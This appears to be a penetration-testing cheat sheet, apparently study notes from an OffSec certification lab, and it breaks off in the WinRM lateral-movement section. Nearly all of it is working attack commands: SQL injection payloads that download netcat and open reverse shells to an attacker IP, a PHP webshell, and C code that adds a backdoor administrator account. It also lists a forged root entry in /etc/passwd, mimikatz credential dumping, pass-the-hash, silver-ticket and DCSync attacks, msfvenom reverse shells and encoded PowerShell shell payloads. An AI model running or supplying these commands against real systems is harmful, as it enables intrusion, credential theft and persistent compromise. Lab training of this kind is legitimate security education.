<!-- TOC start (generated with https://github.com/derlin/bitdowntoc) -->

- [Information Gathering](#information-gathering)
   * [Pasive ](#pasive)
   * [Active](#active)
      + [SMB Enumeration](#smb-enumeration)
      + [SMTP](#smtp)
      + [SNMP](#snmp)
- [SQL Injection Attacks](#sql-injection-attacks)
   * [Identifiying SQLi via error-based payloads](#identifiying-sqli-via-error-based-payloads)
   * [UNION-based Payloads](#union-based-payloads)
   * [Blind SQL Injections](#blind-sql-injections)
   * [Manual Code Execution](#manual-code-execution)
   * [Automating the attack](#automating-the-attack)
- [Password Attacks](#password-attacks)
   * [Cewl](#cewl)
   * [Password Manager](#password-manager)
   * [SSH Private Key Passphrase](#ssh-private-key-passphrase)
   * [Cracking NTLM](#cracking-ntlm)
   * [Passing NTLM](#passing-ntlm)
   * [Cracking Net-NTLMv2](#cracking-net-ntlmv2)
   * [Relaying Net-NTLMv2](#relaying-net-ntlmv2)
- [Windows Privilege Escalation](#windows-privilege-escalation)
   * [Situational Awareness](#situational-awareness)
   * [Hidden in Plain View](#hidden-in-plain-view)
   * [Information Goldmine Powershell](#information-goldmine-powershell)
   * [Automated Enumeration](#automated-enumeration)
   * [Service Binary Hijacking](#service-binary-hijacking)
   * [Service DLL Hijacking](#service-dll-hijacking)
   * [Unquoted Service Paths](#unquoted-service-paths)
   * [Scheduled Tasks](#scheduled-tasks)
   * [Using exploits](#using-exploits)
- [Linux Privilege Escalation](#linux-privilege-escalation)
   * [Manual Enumeration](#manual-enumeration)
   * [Automated Enumeration](#automated-enumeration-1)
   * [Insecure File Permissions](#insecure-file-permissions)
   * [Abusing Password Authentication](#abusing-password-authentication)
   * [Easy root shell](#easy-root-shell)
   * [Abusing Setuid Binaries and Capabilities](#abusing-setuid-binaries-and-capabilities)
   * [Abusing sudo](#abusing-sudo)
   * [Exploiting Kernel Vulnerabilities](#exploiting-kernel-vulnerabilities)
- [Port Redirection and SSH Tunneling](#port-redirection-and-ssh-tunneling)
   * [Port Forwward with socat](#port-forwward-with-socat)
   * [SSH Local Port Forwarding](#ssh-local-port-forwarding)
   * [SSH Dynamic Port Forwarding](#ssh-dynamic-port-forwarding)
   * [SSH Remote Port Forwarding](#ssh-remote-port-forwarding)
   * [SSH Remote Dynamic Port Forwarding](#ssh-remote-dynamic-port-forwarding)
   * [Using sshuttle](#using-sshuttle)
   * [Port Forwarding with Windows Tools](#port-forwarding-with-windows-tools)
      + [ssh.exe](#sshexe)
      + [Plink](#plink)
      + [Netsh](#netsh)
- [Tunneling Through Deep Packet Inspection](#tunneling-through-deep-packet-inspection)
   * [HTTP Tunneling with Chisel](#http-tunneling-with-chisel)
   * [DNS Tunneling with dnscat2](#dns-tunneling-with-dnscat2)
   * [Ligolo](#ligolo)
- [Metasploit](#metasploit)
- [Active Directory Introduction and Enumeration](#active-directory-introduction-and-enumeration)
   * [Manual Enumeration - Expanding our Repertoire](#manual-enumeration-expanding-our-repertoire)
   * [Active Directory - Automated Enumeration](#active-directory-automated-enumeration)
- [Attacking Active Directory Authentication](#attacking-active-directory-authentication)
   * [Password Attacks](#password-attacks-1)
   * [AS-REP Roasting](#as-rep-roasting)
   * [Kerberoasting](#kerberoasting)
   * [Silver Tickets](#silver-tickets)
   * [Domain Controller Synchronization](#domain-controller-synchronization)
- [Lateral Movement in Active Directory](#lateral-movement-in-active-directory)
   * [WMI and WinRM](#wmi-and-winrm)
   * [PsExec ](#psexec)
   * [Pass the Hash](#pass-the-hash)
   * [Overpass the Hash](#overpass-the-hash)
   * [Pass the Ticket](#pass-the-ticket)
   * [DCOM](#dcom)
   * [Golden Ticket](#golden-ticket)
   * [Shadow Copies](#shadow-copies)
- [Miscelanea](#miscelanea)
   * [Linux spawning shell](#linux-spawning-shell)
   * [Password Spraying](#password-spraying)
   * [Dump git branches](#dump-git-branches)
   * [Reverse shell using certutil](#reverse-shell-using-certutil)
   * [Send email](#send-email)
   * [Transfer files](#transfer-files)
      + [SMB](#smb)
      + [RDP mounting shared folder](#rdp-mounting-shared-folder)
      + [Using rdesktop](#using-rdesktop)
      + [Impacket tools](#impacket-tools)
      + [Evil-winrm](#evil-winrm)
      + [C2 frameworks](#c2-frameworks)
      + [FTP](#ftp)

<!-- TOC end -->

<!-- TOC --><a name="information-gathering"></a>
# Information Gathering

<!-- TOC --><a name="pasive"></a>
## Pasive 
`kali@kali:~$ whois megacorpone.com -h 192.168.50.251`
Google, Netcraft, Gitleaks, Gitrob, Shodan, Security Headers

<!-- TOC --><a name="active"></a>
## Active
`kali@kali:~$ host www.megacorpone.com`

`kali@kali:~$ host -t mx megacorpone.com`

`kali@kali:~$ cat list.txt`

	www
	ftp
	mail
	owa
	proxy
	router

`kali@kali:~$ for ip in $(cat list.txt); do host $ip.megacorpone.com; done`

`kali@kali:~$ nc -nvv -w 1 -z 192.168.50.152 3388-3390`

`kali@kali:~$ nc -nv -u -z -w 1 192.168.50.149 120-123`

`kali@kali:~$ sudo nmap -sS 192.168.50.149`

`kali@kali:~$ nmap -sT 192.168.50.149`

`kali@kali:~$ sudo nmap -sU 192.168.50.149`

`kali@kali:~$ sudo nmap -sU -sS 192.168.50.149`

`kali@kali:~$ nmap -sn 192.168.50.1-253`

`kali@kali:~$ nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt`

`kali@kali:~$ grep Up ping-sweep.txt | cut -d " " -f 2`

`kali@kali:~$ nmap -p 80 192.168.50.1-253 -oG web-sweep.txt`

`kali@kali:~$ grep open web-sweep.txt | cut -d" " -f2`

`kali@kali:~$ nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt`

<!-- TOC --><a name="smb-enumeration"></a>
### SMB Enumeration
`kali@kali:~$ sudo nbtscan -r 192.168.50.0/24`

`kali@kali:~$ ls -1 /usr/share/nmap/scripts/smb*`

`kali@kali:~$ nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152`

`C:\> net view \\dc01 /all`

<!-- TOC --><a name="smtp"></a>
### SMTP
`kali@kali:~$ nc -nv 192.168.50.8 25`
	
	VRFY root

<!-- TOC --><a name="snmp"></a>
### SNMP
`kali@kali:~$ echo public > community`

`kali@kali:~$ echo private >> community`

`kali@kali:~$ echo manager >> community`

`kali@kali:~$ for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips`

`kali@kali:~$ onesixtyone -c community -i ips`

`kali@kali:~$ snmpwalk -v1 -c public 192.168.219.156 NET-SNMP-EXTEND-MIB::nsExtendOutputFull`

`kali@kali:~$ snmpwalk -v1 -c public 192.168.219.156 .1 > snmp.txt`

<!-- TOC --><a name="sql-injection-attacks"></a>
# SQL Injection Attacks
<!-- TOC --><a name="identifiying-sqli-via-error-based-payloads"></a>
## Identifiying SQLi via error-based payloads
`offsec' OR 1=1 -- //`

`' or 1=1 in (select @@version) -- //`

`' OR 1=1 in (SELECT * FROM users) -- //`

`' or 1=1 in (SELECT password FROM users) -- //`

`' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`

<!-- TOC --><a name="union-based-payloads"></a>
## UNION-based Payloads
`' ORDER BY 1-- //`

`%' UNION SELECT database(), user(), @@version, null, null -- //`

`' UNION SELECT null, null, database(), user(), @@version  -- //`

`' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`

<!-- TOC --><a name="blind-sql-injections"></a>
## Blind SQL Injections
`http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //`

`http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //`

<!-- TOC --><a name="manual-code-execution"></a>
## Manual Code Execution
`'; EXECUTE sp_configure 'show advanced options', 1; --`

`'; RECONFIGURE; --`

`'; EXECUTE sp_configure 'xp_cmdshell', 1; --`

`'; RECONFIGURE; --`

`'; EXECUTE xp_cmdshell "powershell.exe wget http://192.168.45.181:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe";-- ';`

`'; EXECUTE xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 192.168.45.181 4444";-- ';`

`' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`

<!-- TOC --><a name="automating-the-attack"></a>
## Automating the attack
`kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`

`kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`

`kali@kali:~$ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"`


<!-- TOC --><a name="password-attacks"></a>
# Password Attacks
<!-- TOC --><a name="cewl"></a>
## Cewl
`kali@kali:~$ cewl http://192.168.164.61:8081/ | grep -v CeWL > custom-wordlist.txt `

<!-- TOC --><a name="password-manager"></a>
## Password Manager
`PS C:\> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`

`kali@kali:~$ keepass2john Database.kdbx > keepass.hash`

`kali@kali:~$ hashcat --help | grep -i "KeePass"`

`kali@kali:~$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force`

<!-- TOC --><a name="ssh-private-key-passphrase"></a>
## SSH Private Key Passphrase
`kali@kali:~$ chmod 600 id_rsa`

`kali@kali:~$ ssh -i id_rsa -p 2222 dave@192.168.50.201`

`kali@kali:~$ ssh2john id_rsa > ssh.hash`

<!-- TOC --><a name="cracking-ntlm"></a>
## Cracking NTLM
`PS C:\> Get-LocalUser`

`PS C:\> .\mimikatz.exe`

	privilege::debug
	token::elevate
	lsadump::sam
	
`kali@kali:~$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

<!-- TOC --><a name="passing-ntlm"></a>
## Passing NTLM
`kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b`

`kali@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`

` kali@kali:~$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`

<!-- TOC --><a name="cracking-net-ntlmv2"></a>
## Cracking Net-NTLMv2
`kali@kali:~$ sudo responder -I tap0 
C:\> dir \\IP_Kali\test`

`kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force`

<!-- TOC --><a name="relaying-net-ntlmv2"></a>
## Relaying Net-NTLMv2
`kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t IP_Target -c "powershell -enc JABjAGwAaQBlAG4AdA..."`

`C:\>dir \\IP_Kali\test`

> when finding backup SAM and SYSTEM files in windows.old/Windows/system32

`kali@kali:~$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL > SAMhashes`

> dont use samdump2. It ouputs wrong hashes

<!-- TOC --><a name="windows-privilege-escalation"></a>
# Windows Privilege Escalation
<!-- TOC --><a name="situational-awareness"></a>
## Situational Awareness
`C:\> whoami /groups`

`PS C:\> Get-LocalUser`

`PS C:\> Get-LocalGroup`

`PS C:\> Get-LocalGroupMember Administrators`

`C:\> systeminfo`

`C:\> ipconfig /all`

`C:\> route print`

`C:\> netstat -ano`

<!-- TOC --><a name="hidden-in-plain-view"></a>
## Hidden in Plain View
`PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

`PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

`PS C:\> Get-Process`

`PS C:\> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`

`PS C:\> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`

`PS C:\> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`

`C:\> net user steve`

`C:\> runas /user:backupadmin cmd`

<!-- TOC --><a name="information-goldmine-powershell"></a>
## Information Goldmine Powershell
`PS C:\> Get-History`

`PS C:\> (Get-PSReadlineOption).HistorySavePath`

`kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"`

<!-- TOC --><a name="automated-enumeration"></a>
## Automated Enumeration
`PS C:\> iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe`
> winPEAS may falsely detect Windows 11 as Windows 10

<!-- TOC --><a name="service-binary-hijacking"></a>
## Service Binary Hijacking
`PS C:\> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

`C:\> icacls "C:\xampp\apache\bin\httpd.exe"`

	#include <stdlib.h>
	
	int main ()
	{
	  int i;
	  
	  i = system ("net user dave2 password123! /add");
	  i = system ("net localgroup administrators dave2 /add");
	  
	  return 0;
	}

`kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`

`C:\> sc.exe stop mysql`

`C:\> net stop mysql`

`PS C:\> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}`

`PS C:\> whoami /priv`

`PS C:\> . .\PowerUp.ps1`

`PS C:\> Get-ModifiableServiceFile`

<!-- TOC --><a name="service-dll-hijacking"></a>
## Service DLL Hijacking
`PS C:\> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

`C:\> icacls .\Documents\BetaServ.exe`

`PS C:\> Restart-Service BetaService`

`PS C:\> $env:path`

	#include <stdlib.h>
	#include <windows.h>
	
	BOOL APIENTRY DllMain(
	HANDLE hModule,// Handle to DLL module
	DWORD ul_reason_for_call,// Reason for calling function
	LPVOID lpReserved ) // Reserved
	{
	    switch ( ul_reason_for_call )
	    {
	        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
	        int i;
	  	    i = system ("net user dave2 password123! /add");
	  	    i = system ("net localgroup administrators dave2 /add");
	        break;
	        case DLL_THREAD_ATTACH: // A process is creating a new thread.
	        break;
	        case DLL_THREAD_DETACH: // A thread exits normally.
	        break;
	        case DLL_PROCESS_DETACH: // A process unloads the DLL.
	        break;
	    }
	    return TRUE;
	}

`kali@kali:~$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll`

<!-- TOC --><a name="unquoted-service-paths"></a>
## Unquoted Service Paths

`PS C:\> Get-CimInstance -ClassName win32_service | Select Name,State,PathName`

`PS C:\> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`

`PS C:\> . .\PowerUp.ps1`

`PS C:\> Get-UnquotedService`

<!-- TOC --><a name="scheduled-tasks"></a>
## Scheduled Tasks
`C:\> schtasks /query /fo LIST /v`

<!-- TOC --><a name="using-exploits"></a>
## Using exploits
`C:\> whoami /priv`

	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                Description                               State   
	============================= ========================================= ========
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled


`PS C:\> .\PrintSpoofer64.exe -i -c powershell.exe`

`PS C:\> PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"`

> RottenPotato, SweetPotato or JuicyPotato

> if you see PrintSpoofer failing you need to check if the spooler service is running
 
`PS C:\> Get-Service -Name Spooler`

> Robocopy Backup mode is a way to read and write files ignoring any permissions problems. It uses the SeBackupPrivilege

<!-- TOC --><a name="linux-privilege-escalation"></a>
# Linux Privilege Escalation
<!-- TOC --><a name="manual-enumeration"></a>
## Manual Enumeration
`$ id`

`$ whoami`

`$ sudo -l`

`$ sudo -i`

`$ env`

`$ cat .bashrc`

`$ cat /etc/passwd`

`$ hostname`

`$ cat /etc/issue'`

`$ cat /etc/os-release`

`$ uname -a`

`$ ps aux`

`$ ip a`

`$ routel`

`$ ss -ntlpu`

`$ cat /etc/iptables/rules.v4`

`ls -lah /etc/cron*`

`crontab -l`

`dpkg -l`

`find / -writable -type d 2>/dev/null`

`cat /etc/fstab`

`$ lsblk`

`$ find / -perm -u=s -type f 2>/dev/null`

`$ dpkg --list | grep compiler`

`$ watch -n 1 "ps -aux | grep pass"`

`$ sudo tcpdump -i lo -A | grep "pass"`

`$ find . -type f -name "*.kdbx"`

`$ grep -Rni . -e 'password' // search for interesting string recursively in files.`

`$ ./pspy` 
> Try this when I do not have permission to list running proceses.

<!-- TOC --><a name="automated-enumeration-1"></a>
## Automated Enumeration
`$ chmod a+x ./linpeas.sh`

`$ ./unix-privesc-check standard > output.txt`

> linPeas, linEnum

<!-- TOC --><a name="insecure-file-permissions"></a>
## Insecure File Permissions
`$ grep "CRON" /var/log/syslog`

<!-- TOC --><a name="abusing-password-authentication"></a>
## Abusing Password Authentication
`$ openssl passwd w00t`

`$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd`

`$ su root2`

<!-- TOC --><a name="easy-root-shell"></a>
## Easy root shell
`$ chmod u+s /bin/bash`

`$ /bin/bash -p`

<!-- TOC --><a name="abusing-setuid-binaries-and-capabilities"></a>
## Abusing Setuid Binaries and Capabilities
`$ /usr/sbin/getcap -r / 2>/dev/null`
> https://gtfobins.github.io

<!-- TOC --><a name="abusing-sudo"></a>
## Abusing sudo
`$ sudo -l`

<!-- TOC --><a name="exploiting-kernel-vulnerabilities"></a>
## Exploiting Kernel Vulnerabilities
`$ cat /etc/issue`

`$ uname -r`

`$ arch`

<!-- TOC --><a name="port-redirection-and-ssh-tunneling"></a>
# Port Redirection and SSH Tunneling

<!-- TOC --><a name="port-forwward-with-socat"></a>
## Port Forwward with socat
> from owned machine

`$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`

> to target machine

> from my Kali

`kali@kali:~$ database_admin@192.168.50.63 -p2222`

<!-- TOC --><a name="ssh-local-port-forwarding"></a>
## SSH Local Port Forwarding
`$ ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215` 
> from owned machine to smb target

`kali@kali:~$ smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234`

<!-- TOC --><a name="ssh-dynamic-port-forwarding"></a>
## SSH Dynamic Port Forwarding
`$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215` 
> on owned machine to target

`$ tail /etc/proxychains4.conf`

`$ socks5 Owned_machine_IP 9999`

`$ proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234` 

> to target machine

<!-- TOC --><a name="ssh-remote-port-forwarding"></a>
## SSH Remote Port Forwarding
`kali@kali:~$ sudo systemctl start ssh`

`$ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@IP_Kali`

> On owned machine, from local to target through Kali.

`kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres`

`kali@kali:~$ ssh -R 4444:localhost:4444 web_svc@192.168.244.147`

> Redirect 4444 inconming traffic from MS01 to Kali

`$ ssh -R *:60002:127.0.0.1:60002 kali@IP_Kali`

> on owned machine, redirect to local port. Can open http://127.0.0.1:60002/ from Kali

<!-- TOC --><a name="ssh-remote-dynamic-port-forwarding"></a>
## SSH Remote Dynamic Port Forwarding
`$ ssh -N -R 9998 kali@IP_Kali`
> From owned machine

	kali@kali:~$ tail /etc/proxychains4.conf
	socks5 127.0.0.1 9998

`kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64` 
> to target

<!-- TOC --><a name="using-sshuttle"></a>
## Using sshuttle
`$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`

> On owned machine

`kali@kali:~$ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24`

`kali@kali:~$ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234`

<!-- TOC --><a name="port-forwarding-with-windows-tools"></a>
## Port Forwarding with Windows Tools
<!-- TOC --><a name="sshexe"></a>
### ssh.exe
`kali@kali:~$ sudo systemctl start ssh`

`C:\> ssh.exe -V`
> On owned machine. OpenSSH version must be > 7.6

`C:\> ssh -N -R 1080 kali@192.168.49.100`

`kali@kali:~$ proxychains psql -h 10.4.50.215 -U postgres`
 > to remote target

<!-- TOC --><a name="plink"></a>
### Plink
`C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:3306:127.0.0.1:3306 192.168.49.100` 
> From owned local 9833 to local 3389

`kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833`

<!-- TOC --><a name="netsh"></a>
### Netsh
`C:\> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215`

`kali@kali:~$ sudo nmap -sS 192.168.50.64 -Pn -n -p2222`

`C:\> netsh advfirewall firewall add rule
name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow`

`kali@kali:~$ sudo nmap -sS 192.168.50.64 -Pn -n -p2222`

`kali@kali:~$ ssh database_admin@192.168.50.64 -p2222`

`C:\> netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64`

<!-- TOC --><a name="tunneling-through-deep-packet-inspection"></a>
# Tunneling Through Deep Packet Inspection
<!-- TOC --><a name="http-tunneling-with-chisel"></a>
## HTTP Tunneling with Chisel
`kali@kali:~$ chisel server --port 8080 --reverse
./chisel client IP_Kali:8080 R:socks` 
> On owned machine

`proxychains curl http://127.0.0.1:8000/`
> Works!

`proxychains firefox http://127.0.0.1:8000/`
> Does not work.

`./chisel client IP_Kali:8080 R:8000:127.0.0.1:8000` 
> Navigating to http://127.0.0.1:8000/ works!

<!-- TOC --><a name="dns-tunneling-with-dnscat2"></a>
## DNS Tunneling with dnscat2

`kali@felineauthority:~$ dnscat2-server feline.corp
dnscat2> windows`

`dnscat2> window -i 1`

`database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp`

`command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445`

`kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234`

<!-- TOC --><a name="ligolo"></a>
## Ligolo

[https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)
[https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)

> To remove tun interface

`$ sudo ip link del ligolo`

<!-- TOC --><a name="metasploit"></a>
# Metasploit

`$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.155 LPORT=4445 -f exe -o nonstaged.exe`

`$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=4445 -f elf -o reverse.elf`

`$ msfconsole -q -x 'use multi/handler;set payload  windows/x64/shell_reverse_tcp;set lhost 192.168.45.187; set lport 4445;run'`

<!-- TOC --><a name="active-directory-introduction-and-enumeration"></a>
# Active Directory Introduction and Enumeration

<!-- TOC --><a name="manual-enumeration-expanding-our-repertoire"></a>
## Manual Enumeration - Expanding our Repertoire

`C:\> net user /domain`

`C:\> net user jeffadmin /domain`

`C:\> net group /domain`

`C:\> net group "Sales Department" /domain`

`PS C:\> Import-Module .\PowerView.ps1`

`PS C:\> Get-NetDomain`

`PS C:\> Get-NetUser`
`PS C:\> Get-NetUser | select cn`

`PS C:\> Get-NetUser | select cn,pwdlastset,lastlogon`

`PS C:\> Get-NetGroup "Sales Department" | select member`

`PS C:\> Get-NetComputer`

`PS C:\> Get-NetComputer | select operatingsystem,dnshostname`

`PS C:\> Find-LocalAdminAccess`

`PS C:\> Get-NetSession -ComputerName files04 -Verbose`

`PS C:\> Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl`

`PS C:\> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion`

`PS C:\> .\PsLoggedon.exe \\files04`
> Check logged on users on machine through remote registry (if enabled)

`C:\> setspn -L iis_service`

`PS C:\> Get-NetUser -SPN | select samaccountname,serviceprincipalname`

`PS C:\> Get-ObjectAcl -Identity stephanie
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`

`PS C:\> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName`

`C:\> net group "Management Department" stephanie /add /domain`

`PS C:\> Get-NetGroup "Management Department" | select member`

`PS C:\> Find-DomainShare`

`kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"`

<!-- TOC --><a name="active-directory-automated-enumeration"></a>
## Active Directory - Automated Enumeration
`PS C:\> Import-Module .\Sharphound.ps1`

`PS C:\> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Administrator\Documents\ -OutputPrefix "oscp audit"`

`kali@kali:~$ sudo neo4j start`

`kali@kali:~$ bloodhound`
> Some useful queries

`MATCH (m:Computer) RETURN m`

`MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p`

<!-- TOC --><a name="attacking-active-directory-authentication"></a>
# Attacking Active Directory Authentication

<!-- TOC --><a name="password-attacks-1"></a>
## Password Attacks
`PS C:\> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin`

<!-- TOC --><a name="as-rep-roasting"></a>
## AS-REP Roasting
`kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete`

`kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

`PS C:\Tools> .\Rubeus.exe asreproast /nowrap`

<!-- TOC --><a name="kerberoasting"></a>
## Kerberoasting

`PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast`

`kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

`kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`

<!-- TOC --><a name="silver-tickets"></a>
## Silver Tickets
`PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04`

	mimikatz # privilege::debug
	mimikatz # sekurlsa::logonpasswords
	* NTLM     : 4d28cf5252d39971419580a51484ca09

`PS C:\Users\jeff> whoami /user`

 	User Name SID
 	========= =============================================
 	corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105

 .

	mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
	mimikatz # exit

`PS C:\Tools> klist`

`PS C:\Tools> iwr -UseDefaultCredentials http://web04`

<!-- TOC --><a name="domain-controller-synchronization"></a>
## Domain Controller Synchronization
> a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By 
> default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.

`PS C:\Tools> .\mimikatz.exe`
...

`mimikatz # lsadump::dcsync /user:corp\dave`

`kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`

<!-- TOC --><a name="lateral-movement-in-active-directory"></a>
# Lateral Movement in Active Directory

<!-- TOC --><a name="wmi-and-winrm"></a>
## WMI and WinRM
> To create a process on the remote target via WMI, we need the credentials of a member of the Administrators local group, which can also be a domain user.

`C:\> wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"`

	$username = 'jen';
	$password = 'Nexus123!';
	$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
	$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
	$Options = New-CimSessionOption -Protocol DCOM
	$Session = New-Cimsession -ComputerName 192.168.100.100 -Credential $credential -SessionOption $Options
	$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
	HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
	Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};


`C:\> winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"`

`C:\> winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`

> winrm through Powershell

	$username = 'jen';
	$password = 'Nexus123!';
	$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
	$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
